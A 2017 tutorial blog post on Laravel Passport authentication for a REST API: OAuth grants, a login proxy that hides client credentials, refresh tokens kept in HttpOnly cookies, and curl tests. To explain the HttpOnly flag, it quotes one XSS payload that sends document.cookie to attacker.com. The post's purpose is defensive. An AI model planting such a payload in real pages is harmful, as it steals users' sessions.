---
layout:     post
title:      "A modern REST API in Laravel 5 Part 4: Authentication using Laravel Passport"
subtitle:   "Securely authenticate users to use your API using OAuth 2"
date:       2017-03-19 10:00:00 +0200
author:     "Esben Petersen"
header-img: "img/post-bg-06.jpg"
---

## tl;dr

<ul>
  <li>Laravel Passport is an implementation of The PHP League's OAuth Server</li>
  <li>The password grant type can be used for username + password authentication</li>
  <li>Remember to hide your client credentials by making the auth request in a proxy</li>
  <li>Save the refresh token in a HttpOnly cookie to minimize the risk of XSS attacks</li>
</ul>

## Introduction

<p>
  OAuth is all around us. Most of us have tried to login to a 3rd party service
  using our Facebook or Google account as a login. This login mechanism is one of many
  OAuth authentication types. However, you can also use OAuth to generate simple API keys.
  One of the OAuth authentication types generates API keys based on username and password and is
  therefore a solid authentication choice for SaaS-style apps. This article will explore how to
  setup the password grant authentication type in Laravel using Laravel Passport.
</p>

## Agenda

<p>
    During this article we will explore topics such as...
</p>

<ol>
    <li>Learn how authenticating an API with OAuth 2 works</li>
    <li>How we can implement user-based authentication using Laravel Passport</li>
    <li>How we can scope API requests to the current user</li>
</ol>

## OAuth 2 authentication for dummies

<p>
    There are a lot of good in-depth resources on OAuth and it's many use cases. For instance
    <a target="_blank" href="https://tools.ietf.org/html/rfc6749">the official spec</a>. If you
    have the time and the motivation go read it. A little bit too technical/time consuming for you?
    You have come to the right place.
</p>

### The 2-minute introduction to OAuth grants

<p>
    OAuth let's you authenticate using different methods - these methods are called grants.
    This article will not focus on all of them. Here is a quick run-down of the grants.
</p>

<table class="table">
  <thead>
    <tr>
      <th>Grant type</th>
      <th>Used for</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Client Credentials</td>
      <td>When two machines need to talk to each other, e.g. two APIs</td>
    </tr>
    <tr>
      <td>Authorization Code</td>
      <td>This is the flow that occurs when you login to a service using Facebook, Google, GitHub etc.</td>
    </tr>
    <tr>
      <td>Implicit Grant</td>
      <td>
        Similar to Authorization Code, but user-based.
        <a target="_blank" href="https://oauth2.thephpleague.com/authorization-server/implicit-grant/">Has two distinct differences.</a>
        Outside the scope of this article.
      </td>
    </tr>
    <tr>
      <td><strong>Password Grant</strong></td>
      <td>
        When users login using username+password. The focus of this article.
      </td>
    </tr>
    <tr>
      <td><strong>Refresh Grant</strong></td>
      <td>
        Used to generate a new token when the old one expires. Also the focus of this article.
      </td>
    </tr>
  </tbody>
</table>

<p>
  I realize this is a simplification of the grants. If you want a more in-depth description I highly
  recommend either <a target="_blank" href="https://tools.ietf.org/html/rfc6749">the official spec</a>
  or the descriptions on
  <a target="_blank" href="https://oauth2.thephpleague.com/authorization-server/which-grant/">The PHP League's OAuth 2 package website</a>.
</p>

<p>
  If you came here for a description on how to implement Client Credential, Authorization Code or
  Implicit Grants I hate to disappoint you. <u>The focus point of this article is password grants and
  refresh grants</u>. That being said you might learn a trick or two, so please do stick around :-)
</p>

### How password+refresh authentication works

<p>
  This article will describe how to create a typical SPA (single page application) style login flow using
  the password and refresh grants. This might seem daunting at first but it is actually pretty
  simple once get to know the concepts.
</p>

#### Step 1: User enters username + password

<img src="/img/laravel-api-part-4/login.jpg" alt="Login screen for OAuth 2 password flow" class="img-responsive" />

<p>
  The first step of the password flow is that the user will enter username (or email) and password.
  The above image depicts how this looks at <a target="_blank" href="https://traede.com">Traede</a>.
</p>

#### Step 2. API will ask the authentication server if credentials are correct

<p>
  The API sends the username and password to the OAuth server to check if the credentials are correct.
  Saying OAuth server sounds fancy but do not worry. This is probably just a library like
  <a target="_blank" href="https://laravel.com/docs/5.4/passport">Laravel Passport</a> or another implementation
  of <a target="_blank" href="https://oauth2.thephpleague.com/authorization-server/which-grant/">The PHP League's OAuth 2 package</a>
  installed on your API server using Composer.
</p>

#### Step 3. Authentication will return an access token and a refresh token

<p>
  The authentication server will return an access token and a refresh token.
  You send this to the user and the user stores it
  in a cookie, session storage or similar. Every time the user clicks something that interacts with the
  API this token will be attached to the request using the <code>Authorization</code> header. The API will
  look for users with that token, and check that the token is still valid (e.g. not expired). Voila! The
  API now know which user is requesting.
</p>

#### Step 4. Request a new token using the fresh token when the access token expires

<p>
  Remember in step 3 that the authentication server sends both an access token and a refresh token?
  The access token is actually short lived, e.g. it is only valid for a short period of time. Usually they
  are only valid for something like 10 minutes. This is to increase security. When a token is only valid
  for 10 minutes it becomes difficult for a hacker to use it for anything useful if obtained.
</p>

<p>
  When the token expires the user needs to refresh the token. After all who wants to be logged out every 10 minutes?
  The user sends a request to the API to refresh the access token. The refresh token is saved, encrypted
  in a <code>HttpOnly</code> cookie (more on this later). The authentication server checks if the user's
  refresh token is valid. If so, a new access token (and sometimes refresh token) is sent to the user.
  When the new access token expires step 4 is run again. And then again. And again. And so forth...
</p>

### One last thing: there is something called clients

<p>
  For now, the last OAuth concept I will introduce is that of clients.
</p>

<img src="/img/api-desktop-smartphone-tablet-clients.png"
  alt="A REST api can serve multiple clients, like a smartphone-, tablet- or desktop client" class="img-responsive" />

<p>
  Imagine you have an API. And that API powers a desktop application that runs in a browser, a native smartphone
  application and a native tablet application. All of these different applications are called <i>clients</i>.
</p>

<p>
  In OAuth, when a user request an access token they request it for a <i>specific client</i>. That means
  a user can have a separate access token for each client (e.g. one for browser, one for smartphone, one for tablet).
</p>

<p>
  There is one <u>very important security aspect in regards to clients</u> that not that many OAuth articles
  focus on but we will here: the authentication proxy.
</p>

#### Hide the client credentials in a proxy

<p>
  For the OAuth server to know what client you are requesting a token for you have to send client credentials
  as well. Below is an example of how it would actually look in your API.
</p>

```php?start_inline=1
$accessTokenAndRefreshToken = $this->oAuthServer->checkUserCredentials([
  'client_id' => 'browser_app',
  'client_secret' => '1234',
  'username' => 'esben@esben.dk',
  'password' => '1234'
]);
```

<p>
  Now you would be surprised if you knew how many people actually save the client credentials directly in
  their client application. For instance I have seen this in javascript apps.
</p>

```javascript
var username = $('#username').val()
var password = $('#password').val()

$.post('/login', {
  client_id: 'browser_app',
  client_secret: '1234',
  username: username,
  password: password
})
```

<p>
  This often occurs when the client directly requests authentication from the authentication server.
  The problem here is that the client credentials is stored in publicly available code (aka. the
  javascript code). Now anyone that browses your clients source can find your client credentials
  which is a security breach.
</p>

```
The client logs in directly from authentication server
======================================================
       User credentials
       Client credentials
Client -----------------> Auth server
       <-----------------
       Access token
       Refresh token

The client requests resources from the API
======================================================
       Access token
Client -----------------> API
       <-----------------
       Some resource
```

<p>
  So what do we do instead? We introduce a proxy! Luckily since we are developing an API the API
  itself can be used as a proxy. Confused? Allow me to demonstrate using the example above.
</p>

```
The client logs in using the API which uses the auth server
===========================================================
                             Client credentials
       User credentials      User credentials
Client ----------------> API ------------------> Auth server
       <----------------     <------------------
       Access token          Access token
       Refresh token         Refresh token

The client requests resources from the API
======================================================
       Access token
Client -----------------> API
       <-----------------
       Some resource
```

<p>
  Notice that now the client does not need to know about sensitive client credentials.
</p>

## Implementing OAuth authorization using Laravel Passport

<p>
  Okay, so now have all the concepts in order. Now let us get to the code. We want
  to create a login screen for our SPA so the user can authenticate themselves. Let
  us just quickly recap the flow.
</p>

<ol>
  <li>We create a client in our OAuth server that represents our app</li>
  <li>The user enters username + password in the login screen and sends it to the API</li>
  <li>The API sends the username + password + client ID + client secret to the OAuth server</li>
  <li>The API saves the refresh token in a <code>HttpOnly</code> cookie</li>
  <li>The API sends the access token to the client</li>
  <li>The client saves the access token in storage, for instance a browser app saves it in localStorage</li>
  <li>The client requests something from the API attaching the access token to the request's <code>Authorization</code> header</li>
  <li>The API sends the access token to the OAuth server for validation</li>
  <li>The API sends the requested resource back to the client</li>
  <li>When the access token expires the client request the API for a new token</li>
  <li>The API sends the request token to the OAuth server for validation</li>
  <li>If valid, steps 4-6 repeats</li>
</ol>

<p>
  The reason why you should save the refresh token as a <code>HttpOnly</code> cookie is
  to prevent Cross-site scripting (XSS) attacks. The <code>HttpOnly</code> flag tells
  the browser that this cookie should not be accessible through javascript. If this flag
  was not set and your site let users post unfiltered HTML and javascript a malicious user
  could post something like this
</p>

```
<a href="#" onclick="window.location = 'http://attacker.com/stole.cgi?text=' + escape(document.cookie); return false;">Click here!</a>
```

<p class="note">
  Malicious code is shamelessly stolen from
  <a target="_blank" href="https://en.wikipedia.org/wiki/HTTP_cookie#Cookie_theft_and_session_hijacking">Wikipedia: HTTP cookie</a>
</p>

<p>
  Now when users click the link the attacker will gain their refresh token. That means that now
  they can generate access tokens and impersonate your user. Ouch!
</p>

<p>
  Enough theory! Let us get on with the code.
</p>

### Dependencies we are going to use

<p>
  Since we are making a Laravel API it makes sense to use Laravel Passport. Laravel's OAuth implementation.
  It is important to know that Laravel Passport is pretty much just an Laravel integration into
  <a target="_blank" href="https://oauth2.thephpleague.com/authorization-server/which-grant/">The PHP League's OAuth 2 package</a>.
  Therefore, to learn the concepts on a more granular level I refer to that package instead of Laravel Passport.
</p>

<p>
  PHP League's OAuth package issues <a target="_blank" href="https://tools.ietf.org/html/rfc7519">JSON Web Token's (JWT)</a>.
  This is simply a way to structure tokens that includes some relevant meta data. For instance the token could include
  meta data as to whether or not this user is an admin.
</p>

### Installation

<p>
  For more detailed instructions you can always refer to <a target="_blank" href="https://laravel.com/docs/5.4/passport">Laravel Passport's documentation</a>.
</p>

<p>
  First install Passport using composer.
</p>

```bash
composer require laravel/passport
```

<p>
  And add the service provider to <code>config/app.php</code>.
</p>

```php?start_inline=1
Laravel\Passport\PassportServiceProvider::class,
```

<p>
  And migrate the tables.
</p>

```bash
php artisan migrate
```

<p>
  When the authorization server returns tokens these are actually encrypted on the server using a 1024-bit RSA keys.
  Both the private and the public key will live in your <code>storage/</code> out of sight.
  To generate the RSA keys run this command. The command will also create our password client.
</p>

```bash
php artisan passport:install
```

<p>
  Remember to save your client secrets somewhere. I usually save them in my <code>.env</code> file.
</p>

```
PERSONAL_CLIENT_ID=1
PERSONAL_CLIENT_SECRET=mR7k7ITv4f7DJqkwtfEOythkUAsy4GJ622hPkxe6
PASSWORD_CLIENT_ID=2
PASSWORD_CLIENT_SECRET=FJWQRS3PQj6atM6fz5f6AtDboo59toGplcuUYrKL
```

<p>
  The personal grant type is a special type of grant that issues tokens that do not expire. For instance when you issue
  access tokens from your GitHub account to be used in for instance Composer that is a personal grant access token.
  One that composer can use for perpetuity to request GitHub on your behalf.
</p>

<p>
  Please refer to  <a target="_blank" href="https://laravel.com/docs/5.4/passport">Laravel Passport's documentation</a>
  for the following steps as they might change in the future.
</p>

<p>
  You will need to add the <code>Laravel\Passport\HasApiTokens</code> trait to your user model. If you use
  <a target="_blank" href="https://github.com/esbenp/larapi">my Laravel API fork</a> all these next things
  are already done for you.
</p>

<p>
  Next you need to run <code>Passport::routes();</code> somewhere, preferably in a your <code>AuthServiceProvider</code>.
  Finally in <code>config/auth.php</code> set the <code>driver</code> property of the <code>api</code> authentication
  guard to <code>passport</code>. If your user model is <u>NOT</u> <code>App\Users</code> then you need to change the
  config in <code>config/auth.php</code> under <code>providers.users.model</code>.
</p>

<p>
  If you have been following the article series or just use <a target="_blank" href="https://github.com/esbenp/larapi">Larapi</a>
  you should make sure the api guard is set in <code>config/optimus.components.php</code> under <code>protection_middleware</code>.
</p>

```php
<?php

return [
    'namespaces' => [
        'Api' => base_path() . DIRECTORY_SEPARATOR . 'api',
        'Infrastructure' => base_path() . DIRECTORY_SEPARATOR . 'infrastructure'
    ],


    'protection_middleware' => [
        'auth:api' // <--- Checks for access token and logging in the user
    ],

    'resource_namespace' => 'resources',

    'language_folder_name' => 'lang',

    'view_folder_name' => 'views'
];
```

<p></p>

#### Configure Passport to issue short-lived tokens

<p>
  Now Passport is pretty much installed. However, there is one important step. Remember how access tokens should
  be short-lived? Passport by default issues long-lived tokens (no, I do not know why). So we need to configure that.
  In the place where you ran <code>Passport::routes();</code> (AuthServiceProvider or similar) put in the following
  configuration.
</p>

```php?start_inline=1
Passport::routes(function ($router) {
    $router->forAccessTokens();
    $router->forPersonalAccessTokens();
    $router->forTransientTokens();
});

Passport::tokensExpireIn(Carbon::now()->addMinutes(10));

Passport::refreshTokensExpireIn(Carbon::now()->addDays(10));
```

<p>
  Also notice we replaced <code>Passport::routes();</code> with a more granular configuration. This way we only
  create the routes that we need. <code>forAccessTokens();</code> enable us to create access tokens.
  <code>forPersonalAccessTokens();</code> enable us to create personal tokens although we will not use this in
  this article. Lastly, <code>forTransientTokens();</code> creates the route for refreshing tokens.
</p>

<p>
  This is my configuration. So an access token expires after 10 minutes and an refresh token expires after 10 days.
  However, in reality your user will probably not be logged out every 10 days since every refresh will generate
  a new refresh token as well (which again will have 10 days expiration).
</p>

#### What did we install?

<p>
  If you run <code>php artisan route:list</code> you can see the new endpoints installed by Laravel Passport.
  I have extracted the ones we are going to focus on below.
</p>


```
| POST | oauth/token         | \Laravel\Passport\Http\Controllers\AccessTokenController@issueToken
| POST | oauth/token/refresh | \Laravel\Passport\Http\Controllers\TransientTokenController@refresh
```

<p>
  These are the two routes that our proxy is going to request to generate access tokens. Notice, even though
  these two are publicly available they require the client ID and the client secret which is only known by
  our API. So it would be near impossible to request tokens outside of our flow.
</p>

### Creating the login proxy

<p>
  Now let us install our own routes. This article will assume you have been following the previous articles and
  have a structure setup similar to <a target="_blank" href="https://github.com/esbenp/larapi">my Laravel API fork</a>.
</p>

<p>
  Start by creating three new routes: <code>POST /login</code>, <code>POST /login/refresh</code> and
  <code>POST /logout</code>. And then add a new controller to <code>Infrastructure\Auth\Controllers</code>.
  Put the login and refresh routes in a public routes file (your user needs to be able to login without a
  valid access token). Put the login route in a protected routes file. This will ensure that we can
  identify the user and revoke his tokens.
</p>

<p>
  Put the routes in <code>infrastructure/Auth/routes_public.php</code>.
</p>

```php
<?php

$router->post('/login', 'LoginController@login');
$router->post('/login/refresh', 'LoginController@refresh');
```

<p>
  Put this route in <code>infrastructure/Auth/routes_protected.php</code>.
</p>

```php
<?php

$router->post('/logout', 'LoginController@logout');
```

<p>
  Put the controller in <code>infrastructure/Auth/Controllers/LoginController.php</code>.
</p>

```php
<?php

namespace Infrastructure\Auth\Controllers;

use Illuminate\Http\Request;
use Infrastructure\Auth\LoginProxy;
use Infrastructure\Auth\Requests\LoginRequest;
use Infrastructure\Http\Controller;

class LoginController extends Controller
{
    private $loginProxy;

    public function __construct(LoginProxy $loginProxy)
    {
        $this->loginProxy = $loginProxy;
    }

    public function login(LoginRequest $request)
    {
        $email = $request->get('email');
        $password = $request->get('password');

        return $this->response($this->loginProxy->attemptLogin($email, $password));
    }

    public function refresh(Request $request)
    {
        return $this->response($this->loginProxy->attemptRefresh());
    }

    public function logout()
    {
        $this->loginProxy->logout();

        return $this->response(null, 204);
    }
}
```

<p>
  I also made a <code>LoginRequest</code> class and put it in <code>infrastructure/Auth/Requests/LoginRequest.php</code>.
</p>

```php
<?php

namespace Infrastructure\Auth\Requests;

use Infrastructure\Http\ApiRequest;

class LoginRequest extends ApiRequest
{
    public function authorize()
    {
        return true;
    }

    public function rules()
    {
        return [
            'email'    => 'required|email',
            'password' => 'required'
        ];
    }
}
```

<p>
  Now we have the structure setup to create access tokens for our users. All of this should seem pretty familiar to you.
  So let us move right along to the proxy class. Put this code in <code>infrastructure/Auth/LoginProxy.php</code>.
</p>

```php
<?php

namespace Infrastructure\Auth;

use Illuminate\Foundation\Application;
use Infrastructure\Auth\Exceptions\InvalidCredentialsException;
use Api\Users\Repositories\UserRepository;

class LoginProxy
{
    const REFRESH_TOKEN = 'refreshToken';

    private $apiConsumer;

    private $auth;

    private $cookie;

    private $db;

    private $request;

    private $userRepository;

    public function __construct(Application $app, UserRepository $userRepository) {
        $this->userRepository = $userRepository;

        $this->apiConsumer = $app->make('apiconsumer');
        $this->auth = $app->make('auth');
        $this->cookie = $app->make('cookie');
        $this->db = $app->make('db');
        $this->request = $app->make('request');
    }

    /**
     * Attempt to create an access token using user credentials
     *
     * @param string $email
     * @param string $password
     */
    public function attemptLogin($email, $password)
    {
        $user = $this->userRepository->getWhere('email', $email)->first();

        if (!is_null($user)) {
            return $this->proxy('password', [
                'username' => $email,
                'password' => $password
            ]);
        }

        throw new InvalidCredentialsException();
    }

    /**
     * Attempt to refresh the access token used a refresh token that
     * has been saved in a cookie
     */
    public function attemptRefresh()
    {
        $refreshToken = $this->request->cookie(self::REFRESH_TOKEN);

        return $this->proxy('refresh_token', [
            'refresh_token' => $refreshToken
        ]);
    }

    /**
     * Proxy a request to the OAuth server.
     *
     * @param string $grantType what type of grant type should be proxied
     * @param array $data the data to send to the server
     */
    public function proxy($grantType, array $data = [])
    {
        $data = array_merge($data, [
            'client_id'     => env('PASSWORD_CLIENT_ID'),
            'client_secret' => env('PASSWORD_CLIENT_SECRET'),
            'grant_type'    => $grantType
        ]);

        $response = $this->apiConsumer->post('/oauth/token', $data);

        if (!$response->isSuccessful()) {
            throw new InvalidCredentialsException();
        }

        $data = json_decode($response->getContent());

        // Create a refresh token cookie
        $this->cookie->queue(
            self::REFRESH_TOKEN,
            $data->refresh_token,
            864000, // 10 days
            null,
            null,
            false,
            true // HttpOnly
        );

        return [
            'access_token' => $data->access_token,
            'expires_in' => $data->expires_in
        ];
    }

    /**
     * Logs out the user. We revoke access token and refresh token.
     * Also instruct the client to forget the refresh cookie.
     */
    public function logout()
    {
        $accessToken = $this->auth->user()->token();

        $refreshToken = $this->db
            ->table('oauth_refresh_tokens')
            ->where('access_token_id', $accessToken->id)
            ->update([
                'revoked' => true
            ]);

        $accessToken->revoke();

        $this->cookie->queue($this->cookie->forget(self::REFRESH_TOKEN));
    }
}
```

<p>
  Quite the mouthful, I know. But the important code lives in <code>proxy()</code>. Let us take
  a closer look.
</p>

```php?start_inline=1
public function proxy($grantType, array $data = [])
{
    /*
    We take whatever passed data and add the client credentials
    that we saved earlier in .env. So when we refresh we send client
    credentials plus our refresh token, and when we use the password
    grant we pass the client credentials plus user credentials.
    */
    $data = array_merge($data, [
        'client_id'     => env('PASSWORD_CLIENT_ID'),
        'client_secret' => env('PASSWORD_CLIENT_SECRET'),
        'grant_type'    => $grantType
    ]);

    /*
    We use Optimus\ApiConsumer to make an "internal" API request.
    More on this below.
    */
    $response = $this->apiConsumer->post('/oauth/token', $data);

    /*
    If a token was not created, for whatever reason we throw
    a InvalidCredentialsException. This will return a 401
    status code to the client so that the user can take
    appropriate action.
    */
    if (!$response->isSuccessful()) {
        throw new InvalidCredentialsException();
    }

    $data = json_decode($response->getContent());

    /*
    We save the refresh token in a HttpOnly cookie. This
    will be attached to the response in the form of a
    Set-Cookie header. Now the client will have this cookie
    saved and can use it to request new access tokens when
    the old ones expire.
    */
    $this->cookie->queue(
        self::REFRESH_TOKEN,
        $data->refresh_token,
        864000, // 10 days
        null,
        null,
        false,
        true // HttpOnly
    );

    return [
        'access_token' => $data->access_token,
        'expires_in' => $data->expires_in
    ];
}
```

<p></p>

#### Internal API consumption with Optimus\ApiConsumer

<p>
  One concept that is probably new for you here is that of <code>$this->apiConsumer</code>. This is one of
  my small libraries that you can use for making "internal" requests. The way it works is that it
  will use the Laravel router and "fake" that a request was made by the client. We can use
  this to call one of our own routes. Of course if your authorization server lives on another server,
  or if you prefer to make the request over the internet then you can replace this with an alternative
  mechanism such as Guzzle.
  <a target="_blank" href="http://esbenp.github.io/2015/05/26/lumen-web-api-oauth-2-authentication/">You can check out one of my older articles for a Guzzle example</a>.
</p>

<p>
  The API consumer library is called <code>Optimus\ApiConsumer</code> and you can easily add it to Laravel
  through composer.
  <a target="_blank" href="https://github.com/esbenp/laravel-api-consumer">You can also check out the source code here</a>.
</p>

```bash
composer require optimus/api-consumer 0.2.*
```

<p>
  You will also need to add a service provider to <code>config/app.php</code>.
</p>

```php?start_inline=1
Optimus\ApiConsumer\Provider\LaravelServiceProvider::class,
```

<p></p>

### Testing that things work

<p>
  Now we are ready to test that things are working. First you will need to add a user.
  Somewhere add this code and run it.
</p>

```php?start_inline=1
DB::table('users')->insert([
  'name' => 'Esben',
  'email' => 'esben@esben.dk',
  'password' => password_hash('1234', PASSWORD_BCRYPT)
]);
```

<p>
  This should add a user for us to use for testing. Just remember to remove it again.
  There are a lot of ways for us to test. I prefer to do it quickly from the command line
  using cURL. Run the command below. Remember to switch the url to your own.
</p>

```bash
curl -X POST http://larapi.dev/login -b cookies.txt -c cookies.txt -D headers.txt -H 'Content-Type: application/json' -d '
    {
        "email": "esben@esben.dk",
        "password": "1234"
    }
'
```

<p>
  If you get a response like the one below everything is working properly. If not, try to backtrack
  and see if you missed a step.
</p>

```json
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6Ijc5Y2M4NDVjMGQ3YjZkYjcxMThjNjI3NDRhZTM0MzFkYzc3NTNkODEyNTFjNzFkM2M0MjgwMmVkMmE1ZmVmNDI1ZDk2ODUzOTNlZWIzNDE1In0.eyJhdWQiOiIyIiwianRpIjoiNzljYzg0NWMwZDdiNmRiNzExOGM2Mjc0NGFlMzQzMWRjNzc1M2Q4MTI1MWM3MWQzYzQyODAyZWQyYTVmZWY0MjVkOTY4NTM5M2VlYjM0MTUiLCJpYXQiOjE0ODk5MTQ4MjIsIm5iZiI6MTQ4OTkxNDgyMiwiZXhwIjoxNDg5OTE1NDIyLCJzdWIiOiIyIiwic2NvcGVzIjpbXX0.Se3rO03T9w93m31gSCy8O-FnCZP6FCoIUhU9AyY-Nl3ZZHciuPEP0NikPhrssIOa4-gLRk53j53S_j6Twv_PY_sRosCe2kDA0Qdao5zePV79M_sEvb9VOcbcRHSJMU0GcNo0Cs7B8gf8YDlArj5qKIkoOctO1r9SWcpoEqBl1nHPmueTCUotu3CWWB-LXPNTIMZk13B9misb3oq0n4PUqivAT73aSWLgVH_eJbvG8zxdumpZME_TgX_36YemDm3l_31PMczH9QRkRf86ShP2Ji6gbVZrFnbI5UFOXWEVDGSfl6FVa5NqDi9iqpKNc4WCossy9DlAGGYtKFsbNpMxULZWv7NevblnQ5j0SpbEo_ISSKzfrWELNNSj06KeG7Et8SudIhyTaLv4GIDBA5U-LQY-Z4XutlxVrlkmb2OmClp1SmTaMGK0Fqge3DuxnfurBH3rLrVeOa9OIYz_VUXu9SQhKdLEZyPX3uNO7Yuh5DhLrQ8INrwcYxN1dtg9GNpWqM9h4DJNZ3mPaoEgAGTzzCmXXJL1KF7_h5F2EVl2h0dbzQMZjdacjVvkL-oWLwEXjykpqano6xHUDaYp9Q7RID7ehNcUUwhir8035DnxBr8O3-TVT4QHVWJA-GMVXhpLdHrah2gbhEDfgSoGKuAQQW9KkqTsaC4DvIeYuuKGOB8","expires_in":600}
```

<p>
  If you open <code>headers.txt</code> you can also see the refresh token being set as a <code>HttpOnly</code> cookie.
</p>

```
HTTP/1.1 200 OK
Server: nginx
Content-Type: application/json; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept-Encoding
X-Powered-By: PHP/7.0.10
Cache-Control: no-cache, private
Date: Sun, 19 Mar 2017 09:13:42 GMT
Set-Cookie: refreshToken=eyJpdiI6InQyam9vSXRMenIxMFFWWVVDTUhlbFE9PSIsInZhbHVlIjoiTFF5ZkNlaWNJRmsxSEg4T01XZVN5Q3N3a3hmOTFpU012aFE3N2E4WTd0RXFJMjJNNzVLRTFPUWpKdk52THkyQzc0VFwvcnczaG5lcXR6ZW1BR05TcGMwWFZZZldoNzhHczJtRHhzSjhkVFVqVkQyWEVqUWpNeTdnd3plVDA3TW4wYituTHZHdW5jV01CWWJkZHA5b3V3TmJrZXZpaUhLcmhkTGdqb2lcLzZTb201bzJOaU1DTTdjbkxvZzRWK3lEOXpyMThmVGRPSmZFc09Jc2x1cGV1RmIrVEdSa1RFb1BhSmtTMTRtMXVGMzdkTkRsXC9oOW45TWZNaVB0aHZ3ZTNVUmN0UHpqaVdSS0hHTUhkYk1vOFZvY2IrUHlvb202cHkxekd2N0UxNnlqeVNDV2pGdjc5eEV5WEFzTGxJNHZlSDk2UFhmdTNoTUs2OGtqSk1UZjE1WTBrUzIxazRFSEtTMnB3Y1ZUdGxqRjZ0bDQ5RUIwMFwvM2h4SG0xbk9OZlQwNFFzUnpURTlrSGxXVGhOaUp4amxyN0cxcGVXdlhrNUhXMldjSnNMZ3hVS0ZUV1A3V1Y5K0pOYnJ5VTVQM2p1clF1T052WFl2Yko4YnJUMmdZV1wvb1pUVnVsMUVwOXpFSWRPS0crTmEwa3MrQXlGYUptYnl0K01WbHZxcGFLUW1NemdMbk54Mjg0dkRFMldNTjF0bGVVNmE0MVlYNXk3V3N3dU8rRmVCN0cxNkYzSWJ0UkNpbWZlTTh1R1RJQTc5SnNKcWNrY0tcL2dmTmNiTFJnTjM3WTJpdzhUdGRmb3R2XC9qYlwvVURyWVFiXC9SN2VKOVNLMGVYWStsdTlHaGkxc01ndmlwM1lnYVBjK2wzMERadVdDRGw3Tjk1c0EzNHlZYXhxVlYzZ3N0SUlKUG5aSHB5SjZlREJIamhQb2loeUduNTBlWkJ0SFgzYitTNHpwbTZMNHVwMnZZUnN1K3JtZlpGM0ZrRjc0TVRHR2dxTFNXVnRTbHJhK2Vyc2NxOEorZDloa3dcL1VcL2F1c1lFVXRudW81Uk1vM0tTcU1BVE5LRE5xeHBrNmR3WTRUSFV2MnFncWZ3WHNwdko5NmRZRnU1XC9RemxzTkVsUmZicXB1SThqbE41TFdtMVQyNE1EY0FWN0g4N0grNGExeWlHZGlYZ2hEXC9WUkh2cFVucTFIT1JcL3hsYXR3eWU3UGJFZGprT24yZ29RbG5hSnUxXC81OXZmdFdwZnIzUEFHXC9qcXdTRT0iLCJtYWMiOiI3MTc3MzVhYjg2MDAyY2MwMDQ1MmUxOWQ2OTcxYzFjYWI3ZDMwZjNkZDMwM2UyY2NhZjE0MzA3MDBmYzdiZWZhIn0%3D; expires=Fri, 09-Nov-2018 09:13:42 GMT; Max-Age=51840000; path=/; HttpOnly
X-UA-Compatible: IE=Edge
```

<p>
  Because we use the <code>-c</code> and <code>-b</code> flags we will save and use cookies between requests, just like a browser.
  So we can actually try to refresh our token using the refresh token by running the command below.
</p>

```bash
curl -X POST http://larapi.dev/login/refresh -b cookies.txt -c cookies.txt
```

<p>
  If you get a new access token that means this worked as well. Lastly, we can try to run logout.
</p>

```bash
curl -X POST http://larapi.dev/logout -b cookies.txt -c cookies.txt
```

<p>
  Now, if you run the refresh command you should get a <code>401 Unauthorized</code> response.
</p>

## Scoping user requests to entities belonging to requesting user

<p>
  So now that we got it all working, how do we using it? Well if you added the <code>auth:api</code> guard to
  <code>config/optimus.components.php</code> all of your protected routes will now check for a valid
  access token. If no valid access token was found in the <code>Authorization</code> header of the request
  Laravel will automatically return a 401 response. What is even more nifty is that Passport will automatically
  resolve the user model when requesting using the password grant. This means you can access the current user
  using the <code>AuthManager</code> or the <code>Auth</code> facade.
</p>

<p>
  Imagine you were making the next billion dollar start-up. Let us say you were making the next
  <a target="_blank" href="https://slack.com">Slack</a> competitor. Whenever a user logs into a chat room
  it should display all the channels belonging to that chatroom. So imagine the following relationship.
</p>

```
Chat Room 1 -------> n Users
Chat Room 1 -------> n Channels
```

<img src="/img/laravel-api-part-4/channels.jpg" alt="Channels belonging to a chat room" class="img-responsive" />

<p>
  To fill out the left navigation we have to request all the channels belonging to the Traede team when
  the user logs in. Imagine we have the endpoint <code>GET /channels</code> and that will just get all
  the channels appropriate for the user.
  Now the code below is an arbitrary, made-up example but it should demonstrate
  how one might go about scoping requests based on the current user.
</p>

```php
<?php

namespace Api\ChatRooms\Services;

use Api\ChatRooms\Repositories\ChannelRepository;
use Illuminate\Auth\AuthManager;

class ChatRoomService
{
    private $auth;

    private $channelRepository;

    public function __construct(AuthManager $auth, ChannelRepository $channelRepository)
    {
        $this->auth = $auth;
        $this->channelRepository = $channelRepository;
    }

    public function getChannels()
    {
        $user = $this->auth->user();

        $channels = $this->channelRepository->getWhere('chatroom_id', $user->chatroom_id);

        return $channels;
    }
}
```

<p>
  Now we can have multiple chatrooms on the same API, using the same database. Every user will get a
  different response to <code>GET /channels</code>. This was just a small example of how you use
  the user context to scope your API requests.
</p>

## Conclusion

<p>
  This last example will also conclude this article on how to implement authentication for your API.
  By using Laravel Passport we easily install a robust authentication solution for our API. Using a proxy
  and HttpOnly cookies we increase the security of our solution.
</p>

<p>
  Do not forget to further study the principles of OAuth for the best possible setup. Especially remember
  that the OAuth 2 spec assumes by default that there is a secure connection between the server and
  the client!
</p>

<p>
  The full code to this article can be found here:
  <a href="https://github.com/esbenp/larapi-part-4">larapi-part-4</a>
</p>

<p>
  All of these ideas and libraries are new and underdeveloped.
  Are you interested in helping out? Reach out on
  <a href="mailto:esbenspetersen@gmail.com">e-mail</a>,
  <a href="https://twitter.com/esbenp">twitter</a> or
  <a href="https://github.com/esbenp/larapi/issues">the Larapi repository</a>
</p>

